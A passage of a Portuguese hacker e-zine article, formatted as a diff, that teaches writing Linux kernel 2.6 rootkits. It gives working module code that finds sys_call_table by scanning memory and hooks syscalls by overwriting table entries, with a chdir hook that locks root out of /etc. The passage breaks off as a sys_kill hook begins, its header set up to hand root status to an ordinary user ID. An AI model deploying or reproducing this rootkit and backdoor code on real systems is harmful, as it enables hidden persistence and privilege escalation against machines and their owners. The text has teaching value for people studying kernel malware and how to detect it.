@@ -1,0 +1,1491 @@
+[ --- The Bug! Magazine
+
+                    _____ _              ___               _
+                   /__   \ |__   ___    / __\_   _  __ _  / \
+                     / /\/ '_ \ / _ \  /__\// | | |/ _` |/  /
+                    / /  | | | |  __/ / \/  \ |_| | (_| /\_/
+                    \/   |_| |_|\___| \_____/\__,_|\__, \/
+                                                   |___/
+
+                      [ M . A . G . A . Z . I . N . E ]
+
+
+             [ Numero 0x03 <---> Edicao 0x01 <---> Artigo 0x04 ]
+
+
+.> 05 de Maio de 2008,
+.> The Bug! Magazine < staff [at] thebugmagazine [dot] org >
+
+
+            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+            Escrevendo Rootkits no Linux Kernel 2.6.x Parte I
+            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+
+
+.> 09 de Marco de 2008                       (iniciado em 18/04/2007)
+.> hash < carloslnx [at] gmail [dot] com >
+
+                 "Much of the excitement we get out of our work
+                 is that we don't really know what we are doing."
+        		        -- E. Dijkstra
+
+[ --- Indice
+
++     1.     <---> Introducao
++       1.1.  <->     Pre-requisitos
++	1.2.  <->     RK e o freeze maligno
++	1.3   <->     Consideracoes sobre gcc
++     2.     <---> Syscalls
++	2.1   <->     asmlinkage
++     3.     <---> Diferencas entre as versoes 2.4.x e 2.6.x
++     4.     <---> Arquivos, diretorios e comandos importantes
++     5.     <---> Primeiros passos
++	5.1   <->     printk() e' seu amigo
++       5.2   <->     Visualizando o endereco de sys_call_table e algumas syscalls
++     6.     <---> Hooking de syscall
++       6.1   <->     Hookando sys_chdir() 
++	6.2   <->     Hookando sys_kill()
++	6.3   <->     Hookando sys_getdents64()
++     7.     <---> Pids e sys_getdents64()
++       7.1   <->     Problemas com o uso de sys_getdents64() para pid
++     8.     <---> Hackeando o kernel sem hooking de syscall
++	8.1   <->      Indo direto ao ponto, bye pid!
++     9.     <---> Consideracoes finais
++    10.     <---> Agradecimentos
++    11.     <---> Referencias
++
++
+
+
+[ --- 1. Introducao
+	
+	Na edicao 0x02 da TheBug! Magazine, o Strauss, guerreiro
+fiel do exercito de escovadores de bits, escreveu um artigo sobre isso, sobre
+como escrever modulos de kernel, seu primeiro "hello motherfucking world" e os 
+conhecimentos necessarios a se iniciar nessa jornada sombria e ingrata que e' escrever
+modulos de kernel, mais precisamente, no nosso caso, modulos para o kernel Linux.
+
+	Entao, o leitor mais atento deve perceber que o mal rege nossas intencoes,
+e esse artigo pode ser visto como uma continuacao, mesmo que eu nao tenha avisado ao
+Strauss sobre isso, do artigo dele na edicao 0x02, mas com um porem, levarei em conta
+aqui que voce ja sabe escrever um hello world e ja sabe tambem como funciona os bastidores
+do kernel do Linux, entao esse artigo vem bem a calhar para quem leu o artigo da 0x02
+e ja sabe o abc.
+
+	O leitor tambem nao deve esperar absurdos ninjas aqui. Comecei a ler mais
+profundamente sobre o kernel do Linux quando eu quis, a pouco tempo atras colocar
+uma pid 31337 no meu sistema e assim o fiz:
+
+--- snip ---
+  PID TTY      STAT   TIME COMMAND
+      1 ?        S      0:01 init [3]
+      31337 ?    S      0:00 [migration/0]
+      2 ?        SN     0:00 [ksoftirqd/0]
+      .
+      .
+      .
+--- snip ---
+
+	Mas eu nao fiz essa palhacada com modulos, editei o kernel/pid.c do kernel, recompilei e 
+pronto, tenho uma pid realmente 31337. 
+	Posteriormente percebi que se eu fizesse isso on-the-fly seria muito mais legal,
+mas percebi tambem que seria mais legal fazer um rootkit e dai nasceu esse artigo.
+
+	Meus conhecimentos sobre esse assunto sao recentes e limitados, portanto
+tecnicas ninjas de levitacao eu deixo com o Cris Angel do MindFreak e qualquer besteira
+que eu escreva aqui fique a vontade para me enviar qualquer ofensa e eu ficarei muito
+feliz em responder a altura.
+
+	Divirta-se.
+
+
+[ --- 1.1 Pre-requisitos
+	
+	Nocoes razoaveis de C;
+	Previa leitura do artigo do Strauss na TheBug! Magazine 0x02;
+	Um Linux;
+	Uma VmWare;
+	Um cerebro levemente desenvolvido;
+	Um computador;
+	Varias cervejas.
+
+[ --- 1.2 RK e o freeze maligno
+
+	Voce esta em kernel-land. Em kernel-land e' como Wonderland, do M. Jackson,
+voce pede para entrar e reza para sair entao antes de qualquer coisa descole uma VmWare
+e instale uma distribuicao linux nela, voce realmente vai precisar. Nos sabemos
+da notoria estabilidade do linux mas uma sucessao de kernel panics, e voce vera
+MUITAS, sempre e' arriscado, entao ter uma VmWare pra isso e' fundamental. 
+	
+	O freeze maligno vai tomar conta de voce, voce tera pesadelos com
+kernel panics, uma tela cheia de oops inundara suas noites e Freddy Krugger 
+vai parecer a Cinderela depois disso tudo. 
+	
+	Normal.
+
+	Entao antes de rodar o insmod, sempre use sync ok. Ajuda bastante, e 
+espere sempre o pior. 
+<ironia>A decepcao nao tem lugar quando voce espera o pior.</ironia>
+
+
+[ --- 1.3 Consideracoes sobre gcc
+
+	Quando voce compilar um modulo, se voce ja fez sucessivos upgrades de
+versoes do gcc provavelmente seu kernel tera sido compilado com uma versao
+diferente da atual versao do gcc. Isso pode te trazer problemas como:
+
+---snip---
+# insmod ./teste.ko
+insmod: error inserting './teste.ko': -1 Invalid module format
+# dmesg |tail -1
+[ 4994.345416] teste: disagrees about version of symbol struct_module
+snip---
+	
+	Isso, pelo que eu andei lendo podem ser duas coisas:
+
+	1 - Voce esta linkando seu modulo a um kernel source
+	diferente do que que voce esta usando, verifique o /lib/modules/$(uname -r)/ .
+
+	2 - Um bug. E algumas modificacoes nos headers do kernel, ou seja, suas
+	bibliotecas serao necessarias. Alguns links para isso eu adicionarei ao final
+	do artigo.
+
+	Se voce parar para pensar, isso faz algum sentido. Voce tem um kernel
+rodando no seu sistema que foi compilado com uma versao x do gcc, quando
+voce tenta inserir um modulo para esse rodar juntamente com o kernel, e esse
+modulo foi compilado com uma versao x+1 do gcc e' natural perceber que 
+otimizacoes e outras macumbas ocorrem, macumbas essas diferentes das macumbas
+originais. E' um conflito de pai-de-santo por assim dizer, e nesse terreiro
+quem recebe a pomba gira e' voce!
+
+	Fique a vontade em mandar ofensas `a galera do gcc e do Linux kernel.
+
+	Parece-me que isso ocorre apenas na versao 2.6.x, que e' a serie a qual
+tudo neste artigo foi feito. Se alguem souber o que acontece na kernel 2.4.x eu
+estou curioso para saber.
+
+	Entao, a portabilidade, nesse caso, pode ser complicada, impedindo
+que voce execute o RK em todos os sistemas. 
+	Mas quando o assunto e' hacking nada e' garantido e aprendemos a conviver
+com isso. Portanto, boa sorte.
+	
+
+[ --- 2. Syscalls
+
+	Muitas vezes o kernel precisa lidar com IO, dispositivos e com o 
+sistema ele se utiliza de syscalls. As syscalls desempenham uma funcao
+primordial nessa tarefa, controlando dispositivos, manipulando buffers,
+escrevendo e lendo do usuario e acessando o hardware.
+
+	Existe um arquivo /usr/src/linux/include/asm/unistd.h onde essas syscalls
+sao definidas, e /usr/src/linux/include/linux/syscalls.h guardam seus prototypes.
+Cada syscall recebe um numero unico que vai de 1 (exit) ate 288 (keyctl).
+	Cada syscall executa uma funcao. Quando voce em seu codigo C escreve uma 
+funcao printf() esse printf e' uma interface entre voce e a syscall, a propria funcao
+printf ao escrever na tela ela chama a syscall write definida como 4:
+
+	/usr/src/linux/include/asm/unistd.h:
+	#define __NR_write                4
+
+	/usr/src/linux/include/linux/syscalls.h:
+	ssize_t sys_write(unsigned int fd, const char __user *buf, size_t count)
+
+	Ex: printf("hi\n");
+
+	Quando voce sai de um programa e chama exit em se codigo, esse exit tambem
+e' uma interface para a syscall exit de numero 1:
+
+	/usr/src/linux/include/asm/unistd.h:
+	#define __NR_exit                 1
+
+	Ex: exit(0);
+
+	/usr/src/linux/include/linux/syscalls.h:
+	long sys_exit(int error_code)
+
+	Quando voce muda de diretorio com um cd voce chama a syscall 12:
+
+	/usr/src/linux/include/asm/unistd.h:
+	#define __NR_chdir               12
+
+	Ex: chdir("/etc");
+
+	/usr/src/linux/include/linux/syscalls.h:
+	long sys_chdir(const char __user *filename)
+
+	E dai por diante, cada funcao do seu programa pode chamar uma ou mais syscalls.
+
+	O comando mais importante que voce pode ter para saber quais syscalls um programa
+binario usa e' o strace, seu man se inicia assim:
+
+	strace - trace system calls and signals
+
+	Entao, o output de um comando strace e' a sequencia de system calls que o
+binario usa, veja so o strace resumido do comando echo:
+
+---snip---
+# strace echo oi
+execve("/usr/bin/echo", ["echo", "oi"], [/* 30 vars */]) = 0
+brk(0)                                  = 0x804b000
+.
+.
+.
+old_mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fb6000
+write(1, "oi\n", 3oi
+)                     = 3
+munmap(0xb7fb6000, 4096)                = 0
+exit_group(0)                           = ?
+---snip---
+
+	Percebeu a syscall write() ? Assim como write() o comando echo tambem chama 
+outras syscalls como execve(), que muitas vezes chamam outras e outras syscalls.
+
+	Seguindo o exemplo do chdir() vamos fazer um dummy code e verificar com strace:
+
+---snip---
+#include<stdio.h>
+int main(void){
+	chdir("/etc");
+	return 0;
+}
+---snip---
+
+	Agora veja:
+
+---snip---
+# strace ./teste
+execve("./teste", ["./teste"], [/* 20 vars */]) = 0
+uname({sys="Linux", node="void", ...}) = 0
+brk(0)                                  = 0x804a000
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fe0000
+access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
+open("/etc/ld.so.cache", O_RDONLY)      = 3
+fstat64(3, {st_mode=S_IFREG|0644, st_size=16951, ...}) = 0
+mmap2(NULL, 16951, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7fdb000
+close(3)                                = 0
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 3
+read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\240O\1"..., 512) = 512
+fstat64(3, {st_mode=S_IFREG|0644, st_size=1241392, ...}) = 0
+mmap2(NULL, 1247388, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7eaa000
+mmap2(0xb7fd1000, 28672, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x127) = 0xb7fd1000
+mmap2(0xb7fd8000, 10396, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7fd8000
+close(3)                                = 0
+mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ea9000
+mprotect(0xb7fd1000, 20480, PROT_READ)  = 0
+set_thread_area({entry_number:-1 -> 6, base_addr:0xb7ea98e0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
+munmap(0xb7fdb000, 16951)               = 0
+chdir("/etc")                           = 0
+exit_group(0)                           = ?
+Process 22751 detached
+---snip---
+
+	chdir() foi executado. Um detalhe importante e' que algumas vezes a funcao C
+e' homonima a syscall como o caso do chdir() mas a primeira e' uma funcao C e a segunda
+e' uma syscall ok.
+
+	Uma das formas mais populares de se escrever um rootkit e' o sequestro
+das syscalls. Existem tecnicas como libs tambem mas nao serao abordadas aqui
+porque eu nao as estudei para saber como funcionam.
+
+	Pense comigo, a syscall chdir() muda seu diretorio corrente certo?
+O que acontece se voce sequestrar o endereco dessa syscall e apontar para
+a sua propria funcao? Voce vai controlar o funcionamento do comando cd.
+Pode imprimir na tela um "hello motherfucker" toda vez que alguem der
+um "cd /etc" por exemplo. O mesmo vale para qualquer syscall.
+
+	O que vamos fazer daqui por diante e' zuar com essas syscalls
+for fun and profit e rezar para que o kernel panic maligno nao
+ataque nossos sistemas. 
+
+[ --- 2.1 asmlinkage
+
+	Repare que no topico anterior eu omiti a constante "asmlinkage"
+para os protypes das syscalls em /usr/src/linux/include/linux/syscalls.h, 
+isso porque eu preferi falar um pouco dessa diretiva aqui.
+	A diretiva asmlinkage diz a funcao que seus argumentos _nao_ 
+serao encontrados nos registradores mas sim na stack. 
+
+Toda syscall e' definida dessa forma, com o uso de asmlinkage. 
+E e' assim que mais adiante vamos definir nossas funcoes mais a frente.
+
+
+[ --- 3. Diferencas entre as versoes 2.4.x e 2.6.x
+
+ 	Antes na serie 2.4.x do kernel do linux a escrita de rootkits era facilitada
+porque o endereco da sys_call_table era exportada. 
+	Esse endereco guarda a tabela mapeada no kernel onde se faz referencia
+a todas as syscalls em atividade, esse endereco e' definido na compilacao do kernel
+e e' fixo e somente muda apos uma nova compilacao. 
+	No kernel 2.4.x esse endereco era exportado e poderia facilmente ser 
+recolhido por uma funcao simples. Hoje voce consegue esse endereco indiretamente
+pela funcao syscall close(). Existem outras formas como forca bruta. Essas funcoes
+nao foram criadas por mim e sao well known. 
+	Sendo assim, hookar uma syscall no kernel 2.6.x ficou muito simples, veja
+a funcao que eu, particularmente, uso no meu RK, de Mariusz Burdach:
+
+---snip---
+#include <asm/unistd.h>
+#include "dirstruct.h"
+
+unsigned long **find_sys_call_table(void){
+	unsigned long **sctable;
+	unsigned long ptr;
+        extern int loops_per_jiffy;
+
+        sctable = NULL;
+        for (ptr = (unsigned long)&loops_per_jiffy ; ptr < (unsigned long)&boot_cpu_data ; ptr += sizeof(void *)){
+                unsigned long *p;
+                p = (unsigned long *)ptr;
+
+                if (p[__NR_close] == (unsigned long) sys_close){
+                        sctable = (unsigned long **)p;
+                        return &sctable[0];
+                }
+        }
+        return NULL;
+}
+---snip---
+
+	Algumas vezes isso nem e' necessario, o arquivo System.map, quando reflete o
+atual kernel e se estiver acessivel pode fornecer esse endereco, veja:
+
+---snip---
+# grep sys_call_table System.map
+c03c0d90 R sys_call_table   <------------------ !!!
+c040eed6 R __kstrtab_sys_call_table
+c041d398 R __ksymtab_sys_call_table
+---snip---
+	
+	O endereco 0xc03c0d90 e' o nosso sys_call_table. Voce podera mais tarde
+conferir isso, se tiver o System.map, executar a funcao find_sys_call_table() 
+e perceber que e' o mesmo endereco.
+
+	Uma forma interessante e' comparar esses dois enderecos (System.map 
+e find_sys_call_table()) ate para saber se o System.map do sistema e' o 
+atual pois outras informacoes podem ser recuperadas nesse arquivo.
+
+
+[ --- 4. Arquivos, diretorios e comandos importantes 
+
+	Obviamente voce deve ter os sources do seu kernel instalados
+para a escrita do seu rootkit, assim voce pode tirar duvidas e ter
+referencias do funcionamento do kernel. 
+
+	Uma vez que seu rootkit foi compilado com sucesso, em uma
+maquina alvo voce precisa apenas do /lib/modules/$(uname -r)/ 
+bastando isso para voce compila-lo na maquina, lembrando da questao
+das versoes do gcc e os problemas descritos no inicio do paper
+no capitulo 1.3.
+
+	O System.map e' o arquivo com o mapeamento de enderecamento
+de funcoes do kernel, la se pode encontrar de tudo, as funcoes
+exportadas com seus respectivos enderecos.
+
+	O arquivo /usr/src/linux/include/linux/syscalls.h guarda 
+muitos prototipos de funcoes que voce ira hookar.
+
+	Em /usr/src/linux/include/asm/unistd.h voce encontra as
+definicoes numericas de todas as syscalls, voce pode inclusive 
+criar suas proprias syscalls, sendo necessario inclui-las nesses
+arquivos e recompilar seu kernel, isso nao e' o escopo desse
+documento mas vale a dica.
+
+	O comando dmesg () e' o que voce vai usar para, muitas vezes,
+debugar seu RK, a funcao do kernel printk() escreve nesse buffer.
+
+	O comando strace, ja dito mais acima e' fundamental. Use o parametro 
+-v sempre para ver o output sem abreviacoes. man strace para mais info.
+
+	Makefile e' o que voce vai usar para compilar seus modulos,
+esqueca o simples gcc lala.c -o lala ok. Criei um scriptzinho para
+voce criar seus Makefiles mais simples para seus testes, sem muito
+stress. Veja o paper do Strauss para mais informacoes sobre o
+Makefile.
+
+	o arquivo /proc/kallsyms que contem simbolos exportados do kernel.
+
+	/proc/modules, arquivo gerado pelo kernel com os modulos atualmente
+carregados.
+
+	Para quem nao tem VmWare:
+	Botao RESET e tomada do seu computador-> Acredite, voce vai precisar :)
+
+
+[ --- 5 Primeiros passos
+
+ 	Agora vamos por a mao na massa e fazer nosso primeiro modulo que vai imprimir
+o enderecamento de algumas syscalls bem como o endereco de sys_call_table, que deve
+servir para ilustrar a eficiencia do algoritmo de recuperacao de enderecos e voce
+vai poder comparar com o valor obtido de System.map.
+
+[ --- 5.1 printk() e' seu amigo
+
+ 	Diferentemente de programas userland os programas de kernel sao um pouco
+mais complicados de se debugar, nao e' tao pratico imprimir na tela, nao existe 
+printf(), existe, para imprimir no console a funcao console_print() definida
+em linux/tty.h, mas se mostra insuficiente para qualquer coisa alem do que
+um puts() da vida faz. Nao possui formatacao.
+
+	Entao a galera do kernel resolveu criar o printk() , essa sim
+e' funcional, possui sua formatacao semelhante a printf() com um detalhe
+diferente que ao invez de imprimir no console imprime no output do comando
+dmesg.
+
+	No comeco e' estranho mas voce se acostuma a ver seus outputs dessa
+forma. Sendo assim imagine: 
+
+int i=1000; 
+printk("valor de i: %d\n",i);
+
+	E dmesg para visualizar.
+
+[ --- 5.2 Visualizando o endereco de sys_call_table e algumas syscalls
+
+	Antes vou mostrar o output gerado pelo modulo e em seguida 
+falo sobre ele.
+
+ps: comentarios apos "#"
+
+---snip---
+# dmesg
+(bastante alguma saida suprimida)
+sys_call_table: 0xc0393d00 			#endereco de sys_call_table 
+1 sys_call_table[__NR_exit] -> 0xc0123880	#daqui em diante fica facil
+2 sys_call_table[__NR_fork] -> 0xc0101ae3
+3 sys_call_table[__NR_read] -> 0xc015c1d8
+(bastante alguma saida suprimida)
+#
+---snip---
+
+	No meu caso eu tenho meu /System.map, vamos comparar o endereco que pegamos
+com o endereco contido em System.map de sys_call_table
+
+---snip---
+# grep sys_call_table /System.map
+c0393d00 D sys_call_table
+---snip---
+
+	O Makefile para o nosso primeiro modulo:
+
+---snip---
+MOD_DIR = src
+UTIL_DIR = util
+C_FLAGS = -Wall
+GCC = $(shell which gcc)
+MAKE = $(shell which make)
+SRCDIR = $(shell uname -r)
+RM = $(shell which rm)
+
+obj-m += get_sys_calls.o
+fusion-objs :=  get_sys_calls.o
+
+all:
+        $(MAKE) -C /lib/modules/$(SRCDIR)/build M=$(PWD) modules
+
+clean:
+        $(MAKE) -C /lib/modules/$(SRCDIR)/build M=$(PWD) clean
+---snip---
+	
+	O codigo:
+
+---snip---
+/*
+ * get_sys_calls.c para a TheBug! Magazine 0x03
+ *
+ * Acha os enderecos de sys_call_table e algumas syscalls.
+ *
+ * Carlos Carvalho aka hash <carloslnx AT gmail.com>
+ */
+
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/init.h>
+#include <asm/unistd.h>
+#include <linux/syscalls.h>
+
+typedef struct sys{
+        char *sys_name;
+        int sys_value;
+}sys;
+
+sys sys_t[]=
+{
+        {"__NR_exit" ,       1},
+        {"__NR_fork" ,       2},
+        {"__NR_read" ,       3},
+        {"__NR_write" ,      4},
+        {"__NR_open" ,       5},
+        {"__NR_close" ,      6},
+        {"__NR_creat" ,      8},
+        {"__NR_link" ,       9},
+        {"__NR_unlink" ,     10},
+        {"__NR_execve" ,     11},
+        {"__NR_chdir" ,      12},
+        {"__NR_chmod" ,      15},
+        {"__NR_mount" ,      21},
+        {"__NR_umount" ,     22},
+        {"__NR_setuid" ,     23},
+        {"__NR_ptrace" ,     26},
+        {"__NR_sync" ,       36},
+        {"__NR_kill" ,       37},
+        {"__NR_rename" ,     38},
+        {"__NR_mkdir" ,      39},
+        {"__NR_rmdir" ,      40},
+        {"__NR_umask" ,      60},
+        {"__NR_chroot" ,     61},
+        {"__NR_symlink" ,    83},
+        {"__NR_reboot" ,     88},
+        {"__NR_readdir" ,    89},
+        {"__NR_mmap" ,       90},
+        {"__NR_munmap" ,     91},
+        {"__NR_stat" ,       106},
+        {"__NR_uname" ,      122},
+        {"__NR_chown" ,      182},
+        {"__NR_stat64" ,     195},
+        {"__NR_getdents64" , 220},
+        {NULL ,              0}
+};
+
+//funcao que recupera o endereco de sys_call_table:
+unsigned long **find_sys_call_table(void){
+        unsigned long **sctable, ptr;
+        extern int loops_per_jiffy;
+
+        sctable = NULL;
+        for (ptr = (unsigned long)&loops_per_jiffy ; ptr < (unsigned long)&boot_cpu_data ; ptr += sizeof(void *)){
+                unsigned long *p;
+                p = (unsigned long *)ptr;
+
+                if (p[__NR_close] == (unsigned long) sys_close){
+                        sctable = (unsigned long **)p;
+                        return &sctable[0];
+                }
+        }
+        return NULL;
+}
+
+
+static int __init init_lkm (void){
+        int x;
+
+        void **sys_call_table;
+
+        sys_call_table = (void*)find_sys_call_table();
+        sys *syscall;
+        syscall = sys_t;
+
+        x = 0;
+
+        printk("sys_call_table: 0x%p\n",sys_call_table);
+
+        while(syscall[x].sys_name != NULL){
+                printk("%d sys_call_table[%s] -> 0x%p\n",
+                                syscall[x].sys_value,
+                                syscall[x].sys_name,
+                                sys_call_table[syscall[x].sys_value]);
+                x++;
+        }
+        return 0;
+}
+
+static void __exit exit_lkm (void){}
+
+module_init (init_lkm);
+module_exit (exit_lkm);
+---snip---
+
+	Na funcao find_sys_call_table() voce pode perceber que e´ feito um brute force
+para quando o valor de sys_close for semelhante ao ponteiro p de __NR-close (syscall)
+e´retornado o endereco desse ponteiro, onde seu primeiro elemento aponta para sys_call_table,
+a atraves desse endereco podemos recuperar o endereco de cada syscall no sistema e imprimi-la
+como fiz acima.
+
+	O algoritmo em teoria deve funcionar tambem no kernel 2.4.x ja que ele
+busca o endereco correto independentemente se ele foi exportado ou nao, a unica 
+diferenca para o 2.4 sera um overhead inutil, mas isso somente seria executado uma
+unica vez.
+
+
+[ --- 6 Hooking de syscall
+
+	Como eu disse antes, uma das tecnicas mais populares e que nao faz de
+voce um ser 31337 mas o faz feliz e´ o hooking de syscall com o intuito de
+desviar o fluxo normal execucao, que seria da syscall, para uma funcao que 
+especificarmos.
+
+	Veja o desenho e perceba minhas tecnicas avancadas de ascii art:
+
+	U => 	userland (funcao, programa...) 
+	K/S => 	kernel/syscall
+	M => 	nosso modulo
+
+	userland tool:
+---snip---
+#include<stdio.h>
+#include<unistd.h>
+#include<stdlib.h>
+#include<string.h>
+
+int main(int argc, char **argv){
+        char *dir = malloc(strlen(argv[1])+1);
+        strcpy(dir,argv[1]);
+        chdir(dir);
+        return 0;
+}
+---snip---
+
+	Fluxo normal de execucao:
+
+	+--------------------------------+
+passo1	|U: $ ./userland tool 	         |
+	+--------------------------------+
+passo2	|U: chdir(dir)                   |
+	+--------------------------------+
+passo3	|K/S: sys_call_table[__NR_chdir] |
+	+--------------------------------+
+passo4	|K/S: sys_chdir(dir)             |
+	+--------------------------------+
+de volta a shell
+
+	Fluxo alterado de execucao:
+
+	+-----------------------------------------------------+
+passo1	|M: salva_funcao = &sys_call_table[__NR_chdir]        |
+	+-----------------------------------------------------+
+passo2	|M: sys_call_table[_NR_chdir] = &nossa_funcao         |
+	+-----------------------------------------------------+
+passo3	|U: ./userland tool                                   |
+	+-----------------------------------------------------+
+passo4	|U: chdir(dir)                                        |
+        +-----------------------------------------------------+
+passo5  |K/S: sys_call_table[__NR_chdir]                      |
+	+-----------------------------------------------------+
+passo6  |M: nossa_funcao(dir){    			      |	                       
+	|	if(strncmp(dir,ddir->dname,strlen(dir)) == 0) |
+	|		return -EPERM;			      |
+	|	else					      |	
+	|		return salva_funcao(dir);	      |
+        |  }						      |
+	+-----------------------------------------------------+
+passo7  |M: sys_call_table[_NR_chdir] = &salva_funcao         |
+        +-----------------------------------------------------+
+de volta a shell
+
+	
+	No fluxo normal de execucao tudo transcorre pacificamente, 
+o usuario executa o codigo, que poderia ser um simples "cd" ,mas enfim, esse 
+codigo chama a funcao da biblioteca padrao chdir() que chama a syscall 
+referente a __NR_chdir executando sys_chdir(). 
+
+	A brincadeira fica legal no fluxo alterado de execucao, onde
+levando-se em conta que voce carregou o modulo com insmod ou modprobe,
+salva-se o endereco original de sys_call_table[__NR_chdir], entao
+sys_call_table[_NR] recebe o endereco de nossa_funcao e espera
+pelo usuario executar seu programa, ele executa, chama chdir, o kernel
+verifica o endereco de sys_call_table[_NR_chdir] que agora aponta para
+a nossa_funcao com nosso codigo, executa essa funcao.
+	Ao dar rmmod, quando isso e' possivel (eheh) o endereco de
+sys_call_table[__NR_chdir] e' restaurado senao teremos um simpatico
+kernel panic em algum momento.
+
+	A implementacao dessa estrutura veremos logo, esse mecanismo
+organizacional e' importante ser guardado em mente:
+
+	1 - salva o endereco da syscall original
+	2 - copia esse endereco para a nossa funcao
+	3 - executa nossa funcao de acordo com nossas regras
+	4 - ao sair, com rmmod ou de outra forma, 
+	    restaura o endereco original da syscall
+
+
+	Com isso ainda fresco na mente, vamos para o proximo topico
+onde enfim vamos fazer algo legal hookando, ou sequestrando se preferir,
+uma syscall.
+
+[ --- 6.1  Hookando sys_chdir()
+
+	Syscall -> __NR_chdir -> 12
+	Objetivo -> trancar diretorio /etc se UID == 0
+
+	Primeiro vamos ao codigo e em seguida farei os comentarios:
+
+sys_hook_chdir.h arquivo de definicoes:
+---snip---
+/*
+ * sys_hook_chdir.h
+ *
+ * Carlos Carvalho aka hash
+ *
+ */
+
+#define SAVE_CHDIR                    o_chdir = (long(*)(const char __user *filename)) \
+                                                  (sys_call_table[__NR_chdir]);
+
+#define HOOK_CHDIR                    sys_call_table[__NR_chdir] = (unsigned long *)chdir;
+
+#define RESTORE_CHDIR                 sys_call_table[__NR_chdir] = (unsigned long *)o_chdir;
+
+asmlinkage long (*o_chdir) (const char __user *filename);
+void **sys_call_table;
+const char *dir = "etc";
+const short int lockuid = 0;
+---snip---	
+
+sys_hook_chdir.c modulo:
+---snip---	
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/syscalls.h>
+
+#include "sys_hook_chdir.h"
+
+unsigned long **find_sys_call_table(void){
+        unsigned long **sctable, ptr;
+        extern int loops_per_jiffy;
+
+        sctable = NULL;
+        for (ptr = (unsigned long)&loops_per_jiffy ; ptr < (unsigned long)&boot_cpu_data ; ptr += sizeof(void *)){
+                unsigned long *p;
+                p = (unsigned long *)ptr;
+
+                if (p[__NR_close] == (unsigned long) sys_close){
+                        sctable = (unsigned long **)p;
+                        return &sctable[0];
+                }
+        }
+        return NULL;
+}
+
+asmlinkage long chdir(const char __user *filename){
+
+        if(strstr(filename,dir) && current->uid == lockuid) return -ENOENT;
+
+        return o_chdir(filename);
+
+}
+
+static int __init init_lkm (void){
+
+        sys_call_table = (void*)find_sys_call_table();
+
+        SAVE_CHDIR
+        HOOK_CHDIR
+
+        return 0;
+}
+static void __exit exit_lkm (void){
+        RESTORE_CHDIR
+}
+
+module_init (init_lkm);
+module_exit (exit_lkm);
+---snip---	
+
+	Vamos ver a execucao:
+
+---snip---	
+tty1:
+root@char:/tmp/Dummy# cd /etc
+root@char:/etc# cd -
+/tmp/Dummy
+root@char:/tmp/Dummy# insmod ./sys_hook_chdir.ko
+root@char:/tmp/Dummy# cd /etc
+-bash: cd: /etc: No such file or directory
+root@char:/tmp/Dummy#
+
+tty2:
+hash@char:~$ cd /etc
+hash@char:/etc$
+
+tty1:
+root@char:/tmp/Dummy# rmmod sys_hook_chdir
+root@char:/tmp/Dummy# cd /etc
+root@char:/etc#
+---snip---	
+	
+	Primeiro a gente cria um header file para guardar as variaveis globais
+e macros por questao de organizacao.
+	Nesse header denominado aqui de sys_hook_chdir.h primeiro eu crio a macro:
+
+	#define SAVE_CHDIR                    o_chdir = (long(*)(const char __user *filename)) \
+                                                  (sys_call_table[__NR_chdir]);
+
+	o_chdir recebe o enderco de sys_call_table[__NR_chdir] que no meu sistema
+como foi visto antes, lembra? : 
+	
+	12 sys_call_table[__NR_chdir] -> 0xc015adf612
+
+	Entao, e o prototipo da funcao sys_chdir(), que sao os argumentos que a funcao.
+	A funcao o_chdir() salva o estado original da syscall, que sera restaurado
+quando removermos o modulo, para as coisas serem como eram antes.
+
+	Logo a seguir sys_call_table[__NR_chdir] e' sobrescrito com o endereco da nossa
+funcao chdir() para quando a syscall 12 for chamada aponte para a funcao chdir().
+	Isso guardado em nossa macro HOOK_CHDIR.
+
+	Ao final RESTORE_CHDIR guarda os dados necessarios para o restore que e' a
+operacao inversa onde sys_call_table[__NR_chdir] recebe de volta o endereco orignal
+guardado em o_chdir().
+
+	O resto sao variaveis que guardam o endereco de sys_call_table propriamente
+dita, o diretorio que usamos e a uid a ser informada posteriormente.	
+
+	O corpo de sys_hook_chdir.c e' simples e apenas, depois de recuperar o endereco
+de sys_call_table, chama as macros previamente definidas e restaura ao sair.
+
+
+[ --- 6.2  Hookando sys_kill()
+
+        Syscall -> __NR_kill -> 37
+        Objetivo -> receber status de root para kill especifico
+
+	Novamente vou primeiro expor o codigo, que nada mais e' do
+que uma alteracao do exemplo anterior com sys_chdir(), vamos la:
+
+
+sys_hook_kill.h :
+---snip---
+/*
+ * sys_hook_chdir.h
+ *
+ * Carlos Carvalho aka hash
+ *
+ */
+#define SAVE_KILL                     o_kill = (long(*)(int pid, int sig)) \
+                                                (sys_call_table[__NR_kill]);
+
+#define HOOK_KILL                     sys_call_table[__NR_kill] = (unsigned long *)kill;
+
+#define RESTORE_KILL                  sys_call_table[__NR_kill] = (unsigned long *)o_kill;
+
+#define LEET    31337
+
+asmlinkage long (*o_kill) (pid_t pid, int sig);
+
+void **sys_call_table;
+const short int mkrootuid = 1000;
+---snip---	
+
+sys_hook_kill.c :
+---snip---	
+/*
+ * sys_hook_chdir.c
+ *
+ * Carlos Carvalho aka hash
+ *
+ *
+ */
+
